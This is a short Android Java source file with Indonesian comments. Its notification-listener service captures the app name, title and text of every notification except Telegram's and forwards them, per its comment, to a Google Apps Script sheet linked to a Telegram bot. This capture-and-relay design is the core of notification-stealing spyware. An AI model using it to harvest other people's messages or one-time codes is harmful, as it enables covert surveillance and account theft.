package com.example.app;

import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotificationService extends NotificationListenerService {

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;

        String packageName = sbn.getPackageName();

        // Abaikan jika notifikasi berasal dari Telegram
        if ("org.telegram.messenger".equals(packageName) || "org.telegram.plus".equals(packageName)) {
            return;
        }

        Bundle extras = sbn.getNotification().extras;
        String title = extras.getString("android.title", "Tanpa Judul");
        CharSequence textChar = extras.getCharSequence("android.text");
        String text = (textChar != null) ? textChar.toString() : "Tanpa Isi";

        // Kirim ke Google Apps Script (otomatis terpisah per sheet & terintegrasi ke Bot Telegram)
        ApiHelper.sendNotificationToSheet(packageName, title, text);
    }
}
